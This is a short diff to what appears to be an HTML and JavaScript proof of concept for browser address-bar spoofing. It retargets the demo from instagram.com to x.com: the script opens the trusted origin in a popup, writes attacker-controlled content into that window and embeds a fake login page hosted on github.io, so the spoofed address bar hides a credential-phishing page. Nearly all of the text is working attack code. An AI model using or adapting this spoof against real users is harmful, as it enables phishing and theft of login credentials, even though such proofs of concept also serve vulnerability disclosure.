@@ -12,7 +12,7 @@ iframe { width:90%; height:80vh; border:1px solid #ccc; }
 <script>
 function go() {
     // Open trusted origin
-   var win = window.open('https://www.instagram.com:90');
+   var win = window.open('https://x.com:90');
 
     if (!win) {
         alert("Popup blocked");
@@ -25,7 +25,7 @@ function go() {
             win.document.open();
             win.document.write(`
                 <p class="note">
-                    Demo: Address bar shows google.com, but content below is attacker-controlled.
+                     Fake X.com content below is attacker-controlled.
                 </p>
 
                 <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
